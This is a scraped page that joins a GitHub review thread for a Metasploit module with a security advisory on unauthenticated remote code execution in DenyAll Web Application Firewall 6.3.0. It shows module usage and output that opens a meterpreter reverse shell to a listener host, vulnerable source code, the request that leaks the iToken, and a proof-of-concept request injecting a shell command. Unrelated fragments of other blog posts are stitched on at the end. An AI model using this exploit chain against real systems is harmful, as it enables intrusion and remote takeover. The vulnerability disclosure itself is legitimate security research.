### @mdisec **[mdisec](/mdisec)** commented [Sep 19, 2017](#issue-258803155) • edited by pbarry-r7 Loading

This module exploits the command injection vulnerability of DenyAll Web Application Firewall. Unauthenticated user can execute a terminal command under the context of the web server user.

## Verification

List the steps needed to make sure this thing works

* Start `msfconsole`
* `use exploit/linux/http/denyall_waf_exec`
* Set `RHOST`
* Set `LHOST`
* Run `check`
* **Verify** that you are seeing `The target appears to be vulnerable.`
* Run `exploit`
* **Verify** that you are seeing `iToken` value extraction.
* **Verify** that you are getting `meterpreter` session.

```
msf > use exploit/linux/http/denyall_exec
msf exploit(denyall_exec) >
msf exploit(denyall_exec) > set RHOST 35.176.123.128
RHOST => 35.176.123.128
msf exploit(denyall_exec) > set LHOST 35.12.3.3
LHOST => 35.12.3.3
msf exploit(denyall_exec) > check
[*] 35.176.123.128:3001 The target appears to be vulnerable.
msf exploit(denyall_exec) > exploit

[*] Started reverse TCP handler on 35.12.3.3:4444
[*] Extracting iToken value from unauthenticated accessible endpoint.
[+] Awesome. iToken value = n84b214ad1f53df0bd6ffa3dcfe8059a
[*] Trigerring command injection vulnerability with  iToken value.
[*] Sending stage (40411 bytes) to 35.176.123.128
[*] Meterpreter session 1 opened (35.176.123.128:4444 -> 35.12.3.3:60556) at 2017-09-19 14:31:52 +0300

meterpreter > pwd
/var/log/denyall/reverseproxy
meterpreter >

```

Here is the advisory and technical details about that vulnerability.

This iToken extraction code should be moved to a separate method since the exact same code is also required for exploiting. We can save on a few lines of code.

if the server is php based, was there a particular reason why the default payload is python? There is a php meterpreter, but didn't know if the php pushes to python or something like that where python would be the better option

Thanks for all the review [@h00die](https://github.com/h00die). Nodejs, python and different type of technologies also being used by this product. Also, as far as I know python meterpreter has much more capabilities than the php, such as stdapi.

i'll give this a run over the weekend, i'll also try out the php payload, would be a good thing to note that it also works (for curious minds like myself who have encountered issues in the past)

These look to be public IPs (unverified), you may want to change them to something else like 1.1.1.1 and 2.2.2.2

It was my AWS London instance IP that I've used for testing purpose. It's not alive anymore.

# Advisory | DenyAll Web Application Firewall Unauthenticated Remote Code Execution (CVE-2017-14706)

 [September 19, 2017September 22, 2017](https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Advisories](https://pentest.blog/category/advisories/)

DenyAll Web Application Firewall is the foundation for next generation application security products. It combines ease of configuration – with its workflow engine and management APIs – with a proven ability to secure web applications. It embeds negative and positive security, in-context, user behavior analysis, and soon-to-be added rWeb advanced security engines, to efficiently protect your web applications while minimizing false positives.

### Advisory Informations

**Remotely Exploitable:** Yes

**Authentication Required:** NO

**Vulnerable Version:**6.3.0

**Technology:** NodeJS, Kibana, PHP

**Vendor URL:** <https://www.denyall.com/products/web-application-firewall/>

**CVSSv3 Score:** 10.0 (/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Date of found:** 30 Jun 2017

### Technical Details

While reviewing this product, I’ve seen that it’s possible to have this product on AWS Market for 15-day free usage. (<https://aws.amazon.com/marketplace/pp/B00FGCUM7S>)

So I’ve deployed this product and access to the machine by using SSH key. After several minutes, I’ve seen that administrator interface is written with NodeJS.

First thing that I’ve looked for was about login process.

```
var login = function login(req,res,next) {
    log.debug();

    if (!req.body) req.body = {};

    var data = {
        login:req.body.username || req.query.username,
        pass:req.body.password || req.query.password,
        readOnly:req.body.readOnly || req.query.readOnly || false,
        forceConnexion:req.body.forceConnexion || req.query.forceConnexion || true,
        clientIp: req.ip
    };

    // I OMITTED tHE CODE

    _xmlApiClient.request(opts, function(err, response) {

        // I OMITTED tHE CODE

    },res);

};
```

So it seems there is an internal API where NodeJs use for authentication etc. In order to find out internal API, I went after `_xmlApiClient`

Here is the very interesting function definition from `xmlApiClient.js` file.

```
var xmlApiRequest = function xmlApirequest(opts, callback, res) {

    // ... CODE OMITTED ...

    var target = 'https://' + _config.xmlApi.host + ':' + _config.xmlApi.port + '/webservices/index.php?api=' + opts.api + '&function=' + opts.func;

    // ... CODE OMITTED ...
};
```

We started to getting more promising information about that product. We have PHP api ?. We just need to find out what is the host and port variables which probably comes from configuration file.

```
"xmlApi": {
    "host": "127.0.0.1",
    "port": "3001",
    "guiVersionFile":"/etc/version.txt",
    "nodeId": null,
    "tcpTimeout":1000,
    "httpTimeout":300000
},
```

If you look at the following netstat output, you will see an interesting thing. It looks like localhost binded services but actually it’s not..! 3001 port is publicly accessible as well.

```
~ netstat -tnlp |grep -v '127\|::'

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 172.31.11.218:2222      0.0.0.0:*               LISTEN      -
tcp        0      0 172.31.11.218:22        0.0.0.0:*               LISTEN      -
tcp        0      0 172.31.11.218:3001      0.0.0.0:*               LISTEN      3866/actrld
tcp        0      0 172.31.11.218:3002      0.0.0.0:*               LISTEN      -
```

As you can see TCP Port 3001 is not listening on the localhost.

#### Abusing PHP Backend

Very interesting code snippet for endpoint located at `/webservices/download/index.php` is as follow.

```
if($_REQUEST['typeOf']!='kdbImages' && $_REQUEST['typeOf']!='debug'){
  //validation jeton
  if(isset($_REQUEST['iToken'])){
    if($local->getIToken()!=$_REQUEST['iToken']){
      header('HTTP/1.1 403 Forbidden');
      exit(-1);
    }
  }else{
    if(isset($_REQUEST['tokenId'])){
      if(!API_validUid($_REQUEST['tokenId'])){
        header('HTTP/1.1 403 Forbidden');
        exit(-2);
      }
      $session = loadClass('sessions');
      if($session->searchUid($_REQUEST['tokenId'])===false){
        header('HTTP/1.1 403 Forbidden');
        exit(-3);
      }else{
        if(!isset($_REQUEST['forceNoRefresh'])){
          $session->refreshTimeSession($_REQUEST['tokenId']);
          $session->save();
        }
        unset($session);
      }
    }else{
      header('HTTP/1.1 403 Forbidden');
      exit(-2);
    }
  }
}
```

So if **typeOf**parameter is **NOT** `kdbImages` and `debug`, whole authentication mechanism will be bypassed..! Following code snippet is much more important even it’s not looks like very promising.

```
case 'debug' :
  $norealpath=false;
  $removeSrc=true;
  $compress=false;
  $removeDst=false;
  $autoDownload=true;
  if(!isset($_REQUEST['applianceUid'])){
    debug("download debug sans applianceUid");
    exit;
  }
  $applianceUid=$_REQUEST['applianceUid'];
  $src=downloadFile('debugInternal',$applianceUid,'debug.dat');
  $dst=$src=realpath($src);
  $fileNameDownload=basename($src);
  if(!is_readable($src)) exit;
  break;
```

Above code allow us to download debug.dat file which contains one crucial information. Here is the HTTP GET request where you can trigger this flow.

```
GET /webservices/download/index.php?applianceUid=LOCALUID&typeOf=debug HTTP/1.1
Host: 52.28.216.170:3001

Crucial information is `iToken` .  It’s being used across the application for authentication. So leaking this information gives us a tones of abilities.

#### Command Injection

To be honest, I’ve seen plenty of possible command injection location. One of these location is at `/webservices/stream/tail.php` . Following code snippet is taken from beginning of this file.

```
if(isset($_REQUEST['iToken'])){
  if($local->getIToken()!=$_REQUEST['iToken']){
    exitPrint(t_("Bad key, authentication on slave streaming server failed"));
  }
}else{
  exitPrint(t_("Authentication on slave streaming server failed"));
}

if(isset($_REQUEST['tag']) && $_REQUEST['tag']!=''){
  // on doit chercher le bon fichier
  if(isset($_REQUEST['stime'])&&$_REQUEST['stime']!=''){ // Start time version
    tailDateFile();
  }else{ // dernier fichier ouvert
    if($_REQUEST['tag']=='tunnel') $_REQUEST['file']=basename(shell_run("ls -1t ".__RP_LOG__."*/".$_REQUEST['uid']."/*-".$_REQUEST['type'].".log| head -n1 2>/dev/null"));
    else $_REQUEST['file']=$_REQUEST['uid'].'-'.$_REQUEST['type'].'.log';
  }
}
```

As you can see, authentication is placed by  iToken value which is already leaked by abusing previous bug. There is one very important function call, which is `tailDateFile()`. Here is this function definition.

```
function tailDateFile(){
  global $_REQUEST;

  $stime=(int)($_REQUEST['stime']/1000);

  $tag=$_REQUEST['tag'];
  $uid=$_REQUEST['uid'];
  $type=$_REQUEST['type']; // access or error

  chdir(__RP_LOG__);

  if($tag=='tunnel'){ // reverse proxy
    $files=shell_run("ls -1 */$uid/*-$type-*.log 2>/dev/null|sort")."\n"; // avec date trié au début
    $files.=shell_run("ls -1t */$uid/*-$type.log 2>/dev/null"); // courant trié par utilisation
  }else{
    $files=shell_run("ls -1 $uid-$type*-log 2>/dev/null|sort")."\n";
    $files.=shell_run("ls -1t $uid-$type.log 2>/dev/null");
  }

  // .. CODE OMITTED ..
}
```

As you can see, we are able to control `$uid` parameter and it’s being used as a part of parameter of `shell_run()` function. Viola, we have unauthenticated command injection by combining two issue.

#### PoC

Following HTTP request will trigger the RCE.

```
GET /webservices/stream/tail.php?iToken=y760e0299ba6fc1a2739df5a8f64fc5a&tag=tunnel&stime=aaa&type=aaa$(sleep%2030") HTTP/1.1

A couple of days ago, I came up with news that Pardus will organize a report-bug contest. I love to contribute to open-source projects. So that was a pretty good chance to revisit one of my old friends, Pardus, and uncover security and/or privacy issues.

It has been a while since I haven’t published a post on our beloved blog. Today I would like to share technical details and POC for a pretty funny vulnerability that I’ve found at GravCMS.

As I’ve been saying since 2015, my pentest team and I love to chase after 0days during penetration test engagements. This time we come across a GravCMS during the external OSINT process.

I believe that doing a security research is all about trying to understand high-level of architecture of the products and finding a creative attack vectors.

I hope this blog post will show some the readers how to start doing security research.

I’ve been doing security researches on softwares for a quite long time. During these researchs, I often find myself in a situation where in I think about the state of mind of developers, problems that occur during developments and core problems of nature of software crafting teams. Thinking about these questions always lead me to realize possible software bugs.

~~People~~ developers are tend to make mistakes by the nature of human being. Mistakes made by developers usually end up with software bugs. If there is a software bug, security researchers always try to take an advantage of this bugs and convert it to a software vulnerability. For that reason, I always start my research by defining a places in softwares where things left to the developer’s initiative. One of good the example for that ‘places’, which also main focus of this post, can be a session validations.
